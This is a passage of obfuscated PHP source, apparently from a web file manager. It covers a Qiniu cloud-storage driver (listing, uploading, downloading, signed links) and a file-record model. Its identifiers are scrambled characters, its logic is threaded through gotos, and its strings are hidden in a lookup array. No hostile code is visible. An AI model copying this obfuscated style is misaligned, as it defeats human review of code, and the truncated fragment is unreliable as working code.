listPath($a¼è³ß¨°‰, $Fˆ©¬¡ª¥ğ = false) { $AìµºË‘Ü° =& $_SERVER[£¶ä½¶¢]; $fá ¦§ŸƒÓ = $this->fileList($a¼è³ß¨°‰, $AìµºË‘Ü°[18], !0); foreach ($fá ¦§ŸƒÓ[$AìµºË‘Ü°[85]] as $eŠÒ¶Œö›ò => $FÔŒéº) { $fá ¦§ŸƒÓ[$AìµºË‘Ü°[85]][$eŠÒ¶Œö›ò] = $this->folderInfo($FÔŒéº, $Fˆ©¬¡ª¥ğ); } foreach ($fá ¦§ŸƒÓ[$AìµºË‘Ü°[84]] as $eŠÒ¶Œö›ò => $FÔŒéº) { $fá ¦§ŸƒÓ[$AìµºË‘Ü°[84]][$eŠÒ¶Œö›ò] = $this->fileInfo($FÔŒéº[$AìµºË‘Ü°[103]], $Fˆ©¬¡ª¥ğ, $FÔŒéº); } return $fá ¦§ŸƒÓ; } public function has($EÑ¥†—Ï×³, $eµÈˆª‡‡ = false, $bÓÊË‚™„’ = true) { goto e‡„‰¥‡Ü; e‡„‰¥‡Ü: $A›´Õ‰—ÎŸ =& $_SERVER[£¶ä½¶¢]; $EÑ¥†—Ï×³ = trim($EÑ¥†—Ï×³, $A›´Õ‰—ÎŸ[18]); $eéˆëÌ¦Ï” = empty($EÑ¥†—Ï×³) && $EÑ¥†—Ï×³ !== $A›´Õ‰—ÎŸ[201] ? $A›´Õ‰—ÎŸ[43] : $EÑ¥†—Ï×³ . $A›´Õ‰—ÎŸ[18]; goto C–¦Ş•½è; FÏ–ƒ‹ˆ: return !1; goto eÙ«Ê«Ù«»; C–¦Ş•½è: $CÛ¶ê±ôÒÂ = $A›´Õ‰—ÎŸ[43]; $C„ê¸å”¼Á = 500; $CØ®°³¸ß = $A›´Õ‰—ÎŸ[18]; goto dæç¢‡— ª; dæç¢‡— ª: $DƒóŞì–ˆ˜ = $Eõê´©ƒ˜˜ = 0; while (!0) { check_abort(); list($Aá¯ğ¼Çù‡, $A‘ÒÀî§«Ã) = $this->bucketManager->listFiles($this->bucket, $eéˆëÌ¦Ï”, $CÛ¶ê±ôÒÂ, $C„ê¸å”¼Á, $CØ®°³¸ß); if ($A‘ÒÀî§«Ã) { break; } $CÛ¶ê±ôÒÂ = array_key_exists($A›´Õ‰—ÎŸ[1271], $Aá¯ğ¼Çù‡) ? $CÛ¶ê±ôÒÂ = $Aá¯ğ¼Çù‡[$A›´Õ‰—ÎŸ[1303]] : $A›´Õ‰—ÎŸ[43]; if ($eµÈˆª‡‡) { if (!empty($Aá¯ğ¼Çù‡[$A›´Õ‰—ÎŸ[1304]])) { $DƒóŞì–ˆ˜ += count($Aá¯ğ¼Çù‡[$A›´Õ‰—ÎŸ[1304]]); } if (!empty($Aá¯ğ¼Çù‡[$A›´Õ‰—ÎŸ[1305]])) { $Eõê´©ƒ˜˜ += count($Aá¯ğ¼Çù‡[$A›´Õ‰—ÎŸ[1305]]); } if ($CÛ¶ê±ôÒÂ === $A›´Õ‰—ÎŸ[43]) { break; } continue; } if ($bÓÊË‚™„’) { if (!empty($Aá¯ğ¼Çù‡[$A›´Õ‰—ÎŸ[1304]])) { return !0; } } else { if (!empty($Aá¯ğ¼Çù‡[$A›´Õ‰—ÎŸ[1305]])) { return !0; } } if ($CÛ¶ê±ôÒÂ === $A›´Õ‰—ÎŸ[43]) { break; } } if ($eµÈˆª‡‡) { return array($A›´Õ‰—ÎŸ[213] => $DƒóŞì–ˆ˜, $A›´Õ‰—ÎŸ[214] => $Eõê´©ƒ˜˜); } goto FÏ–ƒ‹ˆ; eÙ«Ê«Ù«»: } public function listAll($bŸ’ÃœñÁ­) { $e¢¼½„»‰Ú =& $_SERVER[£¶ä½¶¢]; $A”ç¿´ªÊé = $this->fileList($bŸ’ÃœñÁ­, $e¢¼½„»‰Ú[43], !0); $cÑŒ¹®Ÿ˜Æ = array(); foreach ($A”ç¿´ªÊé[$e¢¼½„»‰Ú[84]] as $cœÆô¬Å©í) { $cÑŒ¹®Ÿ˜Æ[$cœÆô¬Å©í[$e¢¼½„»‰Ú[103]]] = $cœÆô¬Å©í[$e¢¼½„»‰Ú[88]]; } foreach ($A”ç¿´ªÊé[$e¢¼½„»‰Ú[85]] as $cœÆô¬Å©í) { if (is_string($cœÆô¬Å©í)) { $cÑŒ¹®Ÿ˜Æ[$cœÆô¬Å©í] = 0; } } return $this->listAllFiles($bŸ’ÃœñÁ­, array_keys($cÑŒ¹®Ÿ˜Æ), $cÑŒ¹®Ÿ˜Æ); } private function fileList($b‘Œ²’Ä…, $DòºƒöÈ¥– = '', $CÙêô¼ÍÕ… = 0) { goto b½ÒÎƒÕº; FÛàÛ›¡ñÖ: $açêìîˆÔ = $AñÍ‚Û½·› = array(); while (!0) { check_abort(); list($e‡Ã¯ò‘º, $A¿ğ˜³Ôø©) = $this->bucketManager->listFiles($this->bucket, $c»…¦Ï§Ÿ, $AáÁ©˜İÅ, $dÎ§Ñ£À¨±, $DòºƒöÈ¥–); if ($A¿ğ˜³Ôø©) { break; } $AáÁ©˜İÅ = array_key_exists($e¨¦Î†ñ§Ø[1271], $e‡Ã¯ò‘º) ? $AáÁ©˜İÅ = $e‡Ã¯ò‘º[$e¨¦Î†ñ§Ø[1303]] : $e¨¦Î†ñ§Ø[43]; $C¥œ‚ØÂ²‹ = isset($e‡Ã¯ò‘º[$e¨¦Î†ñ§Ø[1304]]) ? $e‡Ã¯ò‘º[$e¨¦Î†ñ§Ø[1304]] : array(); $cóâÆ¸¶İ = isset($e‡Ã¯ò‘º[$e¨¦Î†ñ§Ø[1305]]) ? $e‡Ã¯ò‘º[$e¨¦Î†ñ§Ø[1305]] : array(); foreach ($C¥œ‚ØÂ²‹ as $b©¶‰£¦©ˆ) { goto CËÙŒµ‘Ô; Dù¶ã»œ›Ã: if ($aŠˆ¸àÀº) { $açêìîˆÔ[] = $eá²ÚÙé¹; continue; } $AñÍ‚Û½·›[] = $CÙêô¼ÍÕ… ? $b©¶‰£¦©ˆ : $eá²ÚÙé¹; goto fÈ±Ã‹ î‰; DÒ´™æ¢™: $b©¶‰£¦©ˆ[$e¨¦Î†ñ§Ø[88]] = $EİÅì¤Ä‡‘; $aŠˆ¸àÀº = $EİÅì¤Ä‡‘ == 0 && substr($eá²ÚÙé¹, strlen($eá²ÚÙé¹) - 1, 1) == $e¨¦Î†ñ§Ø[18] ? !0 : !1; if ($e…œÎ¤Ş) { $this->cacheMethod($e¨¦Î†ñ§Ø[209], $eá²ÚÙé¹, $aŠˆ¸àÀº); $this->cacheMethod($e¨¦Î†ñ§Ø[210], $eá²ÚÙé¹, $b©¶‰£¦©ˆ); } goto Dù¶ã»œ›Ã; CËÙŒµ‘Ô: if ($b©¶‰£¦©ˆ[$e¨¦Î†ñ§Ø[103]] == $c»…¦Ï§Ÿ) { continue; } $eá²ÚÙé¹ = $b©¶‰£¦©ˆ[$e¨¦Î†ñ§Ø[103]]; $EİÅì¤Ä‡‘ = $b©¶‰£¦©ˆ[$e¨¦Î†ñ§Ø[1301]]; goto DÒ´™æ¢™; fÈ±Ã‹ î‰: } foreach ($cóâÆ¸¶İ as $eá²ÚÙé¹) { if ($eá²ÚÙé¹ == $c»…¦Ï§Ÿ) { continue; } $açêìîˆÔ[] = $eá²ÚÙé¹; if ($e…œÎ¤Ş) { $this->cacheMethod($e¨¦Î†ñ§Ø[209], $eá²ÚÙé¹, !0); } } if ($AáÁ©˜İÅ === $e¨¦Î†ñ§Ø[43]) { break; } } if ($e…œÎ¤Ş) { $this->cacheMethod($e¨¦Î†ñ§Ø[209], $b‘Œ²’Ä…, !0); } goto c¢Ÿ±¹Œ; fÒ¢ªÌÓø’: $AáÁ©˜İÅ = $e¨¦Î†ñ§Ø[43]; $dÎ§Ñ£À¨± = 1000; $e…œÎ¤Ş = $this->listItemCache === !1 ? !1 : !0; goto FÛàÛ›¡ñÖ; c¢Ÿ±¹Œ: return array($e¨¦Î†ñ§Ø[85] => $açêìîˆÔ, $e¨¦Î†ñ§Ø[84] => $AñÍ‚Û½·›); goto eÍÕß‹¹“; b½ÒÎƒÕº: $e¨¦Î†ñ§Ø =& $_SERVER[£¶ä½¶¢]; $b‘Œ²’Ä… = trim($b‘Œ²’Ä…, $e¨¦Î†ñ§Ø[18]); $c»…¦Ï§Ÿ = empty($b‘Œ²’Ä…) && $b‘Œ²’Ä… !== $e¨¦Î†ñ§Ø[201] ? $e¨¦Î†ñ§Ø[43] : $b‘Œ²’Ä… . $e¨¦Î†ñ§Ø[18]; goto fÒ¢ªÌÓø’; eÍÕß‹¹“: } public function canRead($dòÕ‰Ëí›¥) { return $this->exist($dòÕ‰Ëí›¥) ? !0 : !1; } public function canWrite($a¨Ò¼­ùÅ) { return $this->exist($a¨Ò¼­ùÅ) ? !0 : !1; } public function getContent($f÷½ËÜ¶Ú‰) { return $this->fileSubstr($f÷½ËÜ¶Ú‰, 0, -1); } public function setContent($C¶‘ƒè¹öÎ, $A†éÆ±¦¢š = '') { $C¦Ø…ƒèÔ¸ = $this->tempFile($this->pathThis($C¶‘ƒè¹öÎ)); file_put_contents($C¦Ø…ƒèÔ¸, $A†éÆ±¦¢š); if ($this->upload($C¶‘ƒè¹öÎ, $C¦Ø…ƒèÔ¸)) { $this->tempFileRemve($C¦Ø…ƒèÔ¸); return !0; } return !1; } public function refreshUrls($C…Ğö¿«Ã¢) { goto eã‚èÂÅê; bóÔ–Çƒ¤¹: $d¶²ÓÙ÷Ä“ = new Qiniu\Cdn\CdnManager($this->auth); list($D¬äæÚäË, $BÖĞÀÀã·) = $d¶²ÓÙ÷Ä“->refreshUrls($EªÉ†²ÊÓÇ); if ($BÖĞÀÀã·) { return !1; } goto d Ì÷œö¸Ÿ; eã‚èÂÅê: $AåÍãÏÌ‡„ =& $_SERVER[£¶ä½¶¢]; $EªÉ†²ÊÓÇ = array(); if (is_array($C…Ğö¿«Ã¢)) { foreach ($C…Ğö¿«Ã¢ as $aÀ·‡´è§ª) { $EªÉ†²ÊÓÇ[] = $this->link($aÀ·‡´è§ª); } } else { $EªÉ†²ÊÓÇ[] = $this->link($C…Ğö¿«Ã¢); } goto bóÔ–Çƒ¤¹; d Ì÷œö¸Ÿ: return $D¬äæÚäË[$AåÍãÏÌ‡„[1076]] == $AåÍãÏÌ‡„[728] ? !0 : !1; goto CÊøùªˆ¯ñ; CÊøùªˆ¯ñ: } public function fileSubstr($b°Éš¦†Õè, $e—Òšñ°ì, $dÓâìÆËÌ) { $bƒÒóÙ™˜¢ =& $_SERVER[£¶ä½¶¢]; if (!($d«ãˆ»ëœ¸ = $this->link($b°Éš¦†Õè))) { return !1; } $F…ÔÎÇê¿Ç = !1; if ($dÓâìÆËÌ > 0) { $Dí×âÅáÀá = $e—Òšñ°ì + $dÓâìÆËÌ - 1; $F…ÔÎÇê¿Ç = array($bƒÒóÙ™˜¢[1306] . $e—Òšñ°ì . $bƒÒóÙ™˜¢[448] . $Dí×âÅáÀá); } $D¼î…Š‚ë = url_request($d«ãˆ»ëœ¸, $bƒÒóÙ™˜¢[238], !1, $F…ÔÎÇê¿Ç); return $D¼î…Š‚ë[$bƒÒóÙ™˜¢[718]] ? $D¼î…Š‚ë[$bƒÒóÙ™˜¢[1086]] : !1; } public function upload($fÜ³ÚĞæßÛ, $f­°³Åª, $BÕ•¯ä´á  = false, $bø”’ Êà = REPEAT_REPLACE) { $dÉã¿›¬§ = new Qiniu\Storage\UploadManager(); $bÌ¬˜¨¼Ú­ = $this->auth->uploadToken($this->bucket, $fÜ³ÚĞæßÛ); $d’“à›ìæ¹ = get_file_mime(get_path_ext($f­°³Åª)); list($E¾÷§çß©Ë, $e‰•éé×·‚) = $dÉã¿›¬§->putFile($bÌ¬˜¨¼Ú­, $fÜ³ÚĞæßÛ, $f­°³Åª, null, $d’“à›ìæ¹); return $e‰•éé×·‚ ? !1 : $this->getPathOuter($fÜ³ÚĞæßÛ); } public function uploadFormData($fáĞ»ÔÎ‹, $aÄ¥éª™õõ = 3600) { return $this->uploadToken($fáĞ»ÔÎ‹, $aÄ¥éª™õõ); } public function multiUploadFormData($E ¨ƒ¸Í“¾, $E›‹À áÖ = 3600) { return $this->uploadToken($E ¨ƒ¸Í“¾, $E›‹À áÖ); } private function uploadToken($FÑ‰ÛÁ×ğ, $c¡…òÖÎÌî = 3600) { goto aˆŠâ½èÛ£; aˆŠâ½èÛ£: $aù¤…—µ¹î =& $_SERVER[£¶ä½¶¢]; $fºÍ¶Ø¶ªò = $c¡…òÖÎÌî; $a¿ø‰ÜÔ« = array($aù¤…—µ¹î[1307] => $aù¤…—µ¹î[1308]); goto FŞ¨›øôÆ®; FŞ¨›øôÆ®: $Dù½ö”°â = $FÑ‰ÛÁ×ğ; $C¿µ±Œ‰Ò = $this->auth->uploadToken($this->bucket, $Dù½ö”°â, $fºÍ¶Ø¶ªò, $a¿ø‰ÜÔ«, !0); $dİ»íîõç = empty($this->region) || $this->region == $aù¤…—µ¹î[1309] ? $aù¤…—µ¹î[43] : $aù¤…—µ¹î[448] . $this->region; goto EÂŠ·Èô¤; EÂŠ·Èô¤: $eŞšËãßîë = http_type() . "\x3a\x2f\x2f\x75\x70\154\x6f\141\144{$dİ»íîõç}\x2e\x71\x69\156\151\x75\x70\x2e\x63\157\x6d\57"; return array($aù¤…—µ¹î[1310] => $C¿µ±Œ‰Ò, $aù¤…—µ¹î[1311] => $eŞšËãßîë); goto Fšğ¹èÌô®; Fšğ¹èÌô®: } public function download($C—ë‰Ê‹Ô”, $C÷Æ«õŠĞ) { goto b©½‘å›¥; b©½‘å›¥: $EïÔ«êÑÃ½ = IO::getPathInner(IO::mkfile($C÷Æ«õŠĞ)); if (!($bƒğ‰çôÍ = $this->link($C—ë‰Ê‹Ô”))) { return !1; } $dèäÙñï· = 0; goto b²ƒºÛ’ÖŞ; b²ƒºÛ’ÖŞ: $c®†¹È…éº = 1024 * 200; $F°Ï˜É¢ìƒ = fopen($EïÔ«êÑÃ½, $_SERVER[£¶ä½¶¢][1312]); while (!0) { $cà‰øã–Ôƒ = $this->fileSubstr($C—ë‰Ê‹Ô”, $dèäÙñï·, $c®†¹È…éº); if ($cà‰øã–Ôƒ === !1) { return !1; } fwrite($F°Ï˜É¢ìƒ, $cà‰øã–Ôƒ); $dèäÙñï· += $c®†¹È…éº; if (strlen($cà‰øã–Ôƒ) < $c®†¹È…éº) { break; } } goto E‘¾»…Œ×Ÿ; E‘¾»…Œ×Ÿ: fclose($F°Ï˜É¢ìƒ); return $C÷Æ«õŠĞ; goto CæÚ‘È·í; CæÚ‘È·í: } public function link($b³êÔÄ›¾, $bõƒ©í£ = '') { if (!$this->isFile($b³êÔÄ›¾)) { return !1; } $fÌˆ£Œ’Ø‰ = $this->getHost() . $_SERVER[£¶ä½¶¢][18] . $this->pathEncode($b³êÔÄ›¾) . $bõƒ©í£; return $this->auth->privateDownloadUrl($fÌˆ£Œ’Ø‰, 3600 * 12); } public function fileOut($C™‡“ÍÒ•£, $bò¼ÙßÒÜ = false, $F ›âø³ÏÎ = false, $C³Úä·É· = '') { $eëŸÙ¨éï =& $_SERVER[£¶ä½¶¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($C™‡“ÍÒ•£, $bò¼ÙßÒÜ, $F ›âø³ÏÎ, $C³Úä·É·); } if (!$F ›âø³ÏÎ) { $F ›âø³ÏÎ = $this->pathThis($C™‡“ÍÒ•£); } $EİºªßÅòÊ = $bò¼ÙßÒÜ ? $eëŸÙ¨éï[1313] . rawurlencode($F ›âø³ÏÎ) : $eëŸÙ¨éï[43]; $bºåÎ•Šˆ® = $this->link($C™‡“ÍÒ•£, $EİºªßÅòÊ); $this->fileOutLink($bºåÎ•Šˆ®); } public function fileOutServer($DèÜ‰ÃÖ½•, $c¡ŸÍµÛÂÓ = false, $b•ÒÇ¿îùÛ = false, $A®„›¬İÂÜ = '') { parent::fileOut($DèÜ‰ÃÖ½•, $c¡ŸÍµÛÂÓ, $b•ÒÇ¿îùÛ, $A®„›¬İÂÜ); } public function fileOutImage($f¨¬Šêí»é, $F—…Ş‡Ó = 250) { $Fé²Ò¨Á¢ø = $this->link($f¨¬Šêí»é, $_SERVER[£¶ä½¶¢][1314] . $F—…Ş‡Ó); $this->fileOutLink($Fé²Ò¨Á¢ø); } public function fileOutImageServer($aÁ»ƒ‘ÜŠß, $e«ìÍñÍŞÎ = 250) { parent::fileOutImage($aÁ»ƒ‘ÜŠß, $e«ìÍñÍŞÎ); } public function hashMd5($a¡ÌâùœÜ™) { $bŒİŠ¨Ê =& $_SERVER[£¶ä½¶¢]; $A˜»ô¶  Ù = $this->objectMeta($a¡ÌâùœÜ™); return isset($A˜»ô¶  Ù[$bŒİŠ¨Ê[218]]) ? $A˜»ô¶  Ù[$bŒİŠ¨Ê[218]] : !1; $d·¬ÆœÃÑ = $this->link($a¡ÌâùœÜ™, $bŒİŠ¨Ê[1315]); } public function size($e˜ÃĞ˜µß”) { $fÂ Ñ¨‡§Ä = $this->objectMeta($e˜ÃĞ˜µß”); return $fÂ Ñ¨‡§Ä ? $fÂ Ñ¨‡§Ä[$_SERVER[£¶ä½¶¢][88]] : 0; } public function info($BÕ¥œèŸ˜…) { if ($this->isFolder($BÕ¥œèŸ˜…)) { return $this->folderInfo($BÕ¥œèŸ˜…); } else { if ($this->isFile($BÕ¥œèŸ˜…)) { return $this->fileInfo($BÕ¥œèŸ˜…); } } return !1; } public function exist($Fò•ÊÅ ˜¼) { return $this->isFile($Fò•ÊÅ ˜¼) || $this->isFolder($Fò•ÊÅ ˜¼); } public function isFile($A«¼ˆê›) { return !$this->isFolder($A«¼ˆê›) && $this->objectMeta($A«¼ˆê›); } public function isFolder($b¹™œòá³˜) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][209], $b¹™œòá³˜); } protected function objectMeta($dÅ÷×¬‡çŠ) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][210], $dÅ÷×¬‡çŠ); } protected function _objectMeta($Fí¶ì²Æ‡Û) { $fßš©«ñ±³ =& $_SERVER[£¶ä½¶¢]; list($D†àóôá¿¦, $Cˆ“­¦µî) = $this->bucketManager->stat($this->bucket, $Fí¶ì²Æ‡Û); if ($D†àóôá¿¦) { $D†àóôá¿¦[$fßš©«ñ±³[88]] = intval($D†àóôá¿¦[$fßš©«ñ±³[1301]]); } return $D†àóôá¿¦; } protected function _isFolder($F…ÖñšÄ¯‘) { $E¾ŠÅÊôö± =& $_SERVER[£¶ä½¶¢]; if ($F…ÖñšÄ¯‘ == $E¾ŠÅÊôö±[43] || $F…ÖñšÄ¯‘ == $E¾ŠÅÊôö±[18]) { return !0; } list($cÁùŒÛïô¶, $EËéˆÓÏ˜) = $this->bucketManager->listFiles($this->bucket, trim($F…ÖñšÄ¯‘, $E¾ŠÅÊôö±[18]) . $E¾ŠÅÊôö±[18], $E¾ŠÅÊôö±[43], 1, $E¾ŠÅÊôö±[18]); return !empty($cÁùŒÛïô¶[$E¾ŠÅÊôö±[1304]]) || !empty($cÁùŒÛïô¶[$E¾ŠÅÊôö±[1305]]) ? !0 : !1; } } goto c¨åÌğ™Ì; C½ï¡ºë¼Í: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\154\x65\x5f\143\x6f\x6e\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\151\155\145", "\164\151\155\x65", "\151\156\x73\x65\162\x74", "\146\x75\x6e\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\x65"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\155\x65" => "\151\157\x5f\x66\151\154\x65\137\x6d\145\164\x61", "\x6d\145\164\141\x46\151\145\154\144" => "\x66\x69\154\x65\111\x44"); public function fileInfo($E“ĞËïË¾±) { $F‹÷Ô°…£Ó =& $_SERVER[£¶ä½¶¢]; static $C¢ØÑ‡òëà = array(); if (!isset($C¢ØÑ‡òëà[$E“ĞËïË¾±])) { $CíƒŠí§° = $F‹÷Ô°…£Ó[1734]; $B¡¡“Ë‹ğ = Model($F‹÷Ô°…£Ó[458])->field($CíƒŠí§°)->where(array($F‹÷Ô°…£Ó[456] => $E“ĞËïË¾±))->find(); $C¢ØÑ‡òëà[$E“ĞËïË¾±] = $B¡¡“Ë‹ğ; } return $C¢ØÑ‡òëà[$E“ĞËïË¾±]; } public function addFileByContent($E®¹ŞîòÈ = '', $dÜ¯‰õšî¦ = '') { goto c‡Â¤â‰®ƒ; A„Î˜‡·‹ã: if (file_exists($FÊ·áÕ)) { @unlink($FÊ·áÕ); } return $aÂöê°Â; goto D¥ö¸­¾ ; FŠ‰æ¯®—: $FÊ·áÕ = $F˜™±´²º£ . $eŠÊ¥ƒõøµ[1736] . rand_string(16); file_put_contents($FÊ·áÕ, $E®¹ŞîòÈ); $aÂöê°Â = $this->addFile($FÊ·áÕ, $dÜ¯‰õšî¦, !0); goto A„Î˜‡·‹ã; c‡Â¤â‰®ƒ: $eŠÊ¥ƒõøµ =& $_SERVER[£¶ä½¶¢]; $F˜™±´²º£ = TEMP_PATH . $eŠÊ¥ƒõøµ[1735]; if (!is_dir($F˜™±´²º£)) { mk_dir($F˜™±´²º£); } goto FŠ‰æ¯®—; D¥ö¸­¾ : } public function createFileName($b÷óÙÁšñÍ, $C¤ÂÄòÂì = false, $e´¸ŞåÈ´– = false) { goto f¥Â±»šâã; f¥Â±»šâã: $d¢ãğ›Õƒ« =& $_SERVER[£¶ä½¶¢]; $c”Ê“àñ£ = IO::init($d¢ãğ›Õƒ«[18]); $A•‘Ö¶ğ‡² = $this->makeFilePath($b÷óÙÁšñÍ, $c”Ê“àñ£, $C¤ÂÄòÂì, $e´¸ŞåÈ´–); goto eÅÁ†Ö…éÅ; aåó™»Óó±: if (!$bĞ´„»Œë && !Cache::get($Cİ¨´ë‘ùˆ)) { $bĞ´„»Œë = !0; $aù­ƒŞ²Ù = IO::mkdir($C¬ÜŒöçŒ); if (!IO::exist($aù­ƒŞ²Ù . $d¢ãğ›Õƒ«[769])) { IO::mkfile($aù­ƒŞ²Ù . $d¢ãğ›Õƒ«[769]); } Cache::set($Cİ¨´ë‘ùˆ, 1, 3600 * 2); } return $A•‘Ö¶ğ‡²; goto C¡ñÜ“’Óè; eÅÁ†Ö…éÅ: $C¬ÜŒöçŒ = $c”Ê“àñ£->pathFather($A•‘Ö¶ğ‡²); static $bĞ´„»Œë = false; $Cİ¨´ë‘ùˆ = $d¢ãğ›Õƒ«[1737] . md5($C¬ÜŒöçŒ); goto aåó™»Óó±; C¡ñÜ“’Óè: } public function makeFilePath($cƒöĞ–‡Ï•, $d„í…¿‡‡ê, $FƒĞ†óù† = false, $CÖ…î¸´Ò‘ = false) { goto Fâö‰‚‘»; Fâö‰‚‘»: $däãÆì°Øà =& $_SERVER[£¶ä½¶¢]; $a¦ğóŒˆÔ = Model($däãÆì°Øà[738])->get($däãÆì°Øà[1738]); $BñÍÈì„œ¿ = KodIO::defaultIO() . date($däãÆì°Øà[1739]); goto fÃ‹®¥ÁÕ; fÃ‹®¥ÁÕ: $a“Š¼¤ÎæÚ = $BñÍÈì„œ¿ . rand_string(5) . short_id(100); $cƒöĞ–‡Ï• = str_replace($däãÆì°Øà[18], $däãÆì°Øà[81], KodIO::clear($cƒöĞ–‡Ï•)); $F¿™ŸÑÃß = $d„í…¿‡‡ê->ext($cƒöĞ–‡Ï•); goto D¾Ş„´¢ò…; D¾Ş„´¢ò…: if (!$cƒöĞ–‡Ï•) { $a¦ğóŒˆÔ = $däãÆì°Øà[1740]; } switch ($a¦ğóŒˆÔ) { case $däãÆì°Øà[1741]: $a“Š¼¤ÎæÚ = $a“Š¼¤ÎæÚ . $däãÆì°Øà[105] . $d„í…¿‡‡ê->ext($cƒöĞ–‡Ï•); if ($F¿™ŸÑÃß == $däãÆì°Øà[1680]) { $a“Š¼¤ÎæÚ .= $däãÆì°Øà[1428]; } break; case $däãÆì°Øà[1742]: goto e†ñß»«¼Ç; e†ñß»«¼Ç: $Eºñ¦‚ŒÅ£ = Model($däãÆì°Øà[738])->get($däãÆì°Øà[739]); $BàÔŠâÉ¾ = substr(md5($däãÆì°Øà[740] . $Eºñ¦‚ŒÅ£ . date($däãÆì°Øà[716])), 0, 8); $f•ñìÑá¼‘ = KodIO::defaultDriver(); goto aƒ­ìâ¿’; aƒ­ìâ¿’: $BñÍÈì„œ¿ = $däãÆì°Øà[1121] . $f•ñìÑá¼‘[$däãÆì°Øà[401]] . $däãÆì°Øà[410] . date($däãÆì°Øà[1743]) . $BàÔŠâÉ¾ . $däãÆì°Øà[18]; if ($F¿™ŸÑÃß == $däãÆì°Øà[1680]) { $cƒöĞ–‡Ï• .= $däãÆì°Øà[1428]; } $Aô´‰¢Ú = $däãÆì°Øà[1744] . $BñÍÈì„œ¿ . $cƒöĞ–‡Ï•; goto Dâ›”Šåµ§; eÍÅƒçá³è: if (IO::isTypeObject($a“Š¼¤ÎæÚ) && !IO::isUploadServer($a“Š¼¤ÎæÚ)) { if (IO::exist($a“Š¼¤ÎæÚ)) { return $a“Š¼¤ÎæÚ; } $CôÁ»äŠĞ = IO::setContent($a“Š¼¤ÎæÚ, $däãÆì°Øà[43]); if (!$CôÁ»äŠĞ) { show_json($däãÆì°Øà[1745], !1); } } CacheLock::unlock($Aô´‰¢Ú); break; goto f«°ª‡´­; Dâ›”Šåµ§: CacheLock::lock($Aô´‰¢Ú); $a“Š¼¤ÎæÚ = $BñÍÈì„œ¿ . $cƒöĞ–‡Ï•; if (IO::exist($BñÍÈì„œ¿ . $cƒöĞ–‡Ï•)) { $a¿¸öó´ÈÚ = substr($cƒöĞ–‡Ï•, 0, strlen($cƒöĞ–‡Ï•) - strlen($F¿™ŸÑÃß)); $bÆ¦ˆ¼ÂŸÔ = $CÖ…î¸´Ò‘ ? substr($CÖ…î¸´Ò‘, 0, 5) : ($FƒĞ†óù† ? substr($FƒĞ†óù†, 0, 5) : rand_string(5)); $a“Š¼¤ÎæÚ = $BñÍÈì„œ¿ . $a¿¸öó´ÈÚ . $bÆ¦ˆ¼ÂŸÔ . $däãÆì°Øà[105] . $F¿™ŸÑÃß; } goto eÍÅƒçá³è; f«°ª‡´­: case $däãÆì°Øà[1740]: break; default: break; } return $a“Š¼¤ÎæÚ; goto CßŒ²™Ğë‹; CßŒ²™Ğë‹: } public function addFileByRemote($AÏ™¿¹©Ì, $EòÂ¸Ë¿, $d‹‚¯ª¬’ = array()) { goto B½ì¦ß–²ê; Béšê’÷Ò¨: if ($D½à³²‚ª = $this->addFileCheckExist($EÅÒ”®ÌËõ[$A÷™œ·¡[181]], $EÅÒ”®ÌËõ[$A÷™œ·¡[180]], $EÅÒ”®ÌËõ[$A÷™œ·¡[88]])) { return $D½à³²‚ª; } return $this->addFileData($EÅÒ”®ÌËõ); goto EùçËö ã; f•é¶»¢¼: $b‘£Ïò‡ï° = IO::hashMd5($AÏ™¿¹©Ì, $Cœ­ÑĞ‹ÆÕ); $A¼í †§©ƒ = KodIO::defaultDriver(); $EÅÒ”®ÌËõ = array($A÷™œ·¡[556] => IO::size($AÏ™¿¹©Ì), $A÷™œ·¡[1746] => 1, $A÷™œ·¡[421] => $EòÂ¸Ë¿, $A÷™œ·¡[781] => $A¼í †§©ƒ[$A÷™œ·¡[401]], $A÷™œ·¡[422] => $AÏ™¿¹©Ì, $A÷™œ·¡[1747] => $d‹‚¯ª¬’[$A÷™œ·¡[181]] ? $d‹‚¯ª¬’[$A÷™œ·¡[181]] : IO::hashSimple($AÏ™¿¹©Ì), $A÷™œ·¡[1748] => $b‘£Ïò‡ï° ? $b‘£Ïò‡ï° : $Cœ­ÑĞ‹ÆÕ); goto Béšê’÷Ò¨; B½ì¦ß–²ê: $A÷™œ·¡ =& $_SERVER[£¶ä½¶¢]; if (!IO::exist($AÏ™¿¹©Ì)) { return !1; } $Cœ­ÑĞ‹ÆÕ = $d‹‚¯ª¬’[$A÷™œ·¡[180]] ? $d‹‚¯ª¬’[$A÷™œ·¡[180]] : $A÷™œ·¡[43]; goto f•é¶»¢¼; EùçËö ã: } private function addFileData($cÌ­¶ªš²Á) { $dóŸ£èÂÒ =& $_SERVER[£¶ä½¶¢]; if (!$cÌ­¶ªš²Á) { return !1; } $cÌ­¶ªš²Á[$dóŸ£èÂÒ[88]] = intval($cÌ­¶ªš²Á[$dóŸ£èÂÒ[88]]); if (!$cÌ­¶ªš²Á[$dóŸ£èÂÒ[88]] && strlen($cÌ­¶ªš²Á[$dóŸ£èÂÒ[181]]) > 32) { $cÌ­¶ªš²Á[$dóŸ£èÂÒ[88]] = intval(substr($cÌ­¶ªš²Á[$dóŸ£èÂÒ[181]], 32)); } $b†­ˆÎ…ë = $this->add($cÌ­¶ªš²Á); return $this->find($b†­ˆÎ…ë); } public function addFile($c¼¼ã™âÀ¸, $d›†êÛˆÏ§, $eÚĞñÊ…ÍÛ = false) { goto Eßä„Á½ç¶; a×¸ÜÜ¦¤¡: $Aá»—•‰×˜ = $_SERVER[£¶ä½¶¢][1749] . $bàäæ¶ñŠÊ; CacheLock::lock($Aá»—•‰×˜); if ($Aê¸”¹Õ’© = $this->addFileCheckExist($DĞÒíÃŠŠ†, $bàäæ¶ñŠÊ, $EÃ™ŠËõ‡Â)) { CacheLock::unlock($Aá»—•‰×˜); return $Aê¸”¹Õ’©; } goto dóñ”‘¶ŞÌ; dóñ”‘¶ŞÌ: $bÉëÒÊİğµ = $this->addFileMake($c¼¼ã™âÀ¸, $EÃ™ŠËõ‡Â, $DĞÒíÃŠŠ†, $bàäæ¶ñŠÊ, $d›†êÛˆÏ§, $eÚĞñÊ…ÍÛ); $Aæ‡ö†‰Ç¯ = 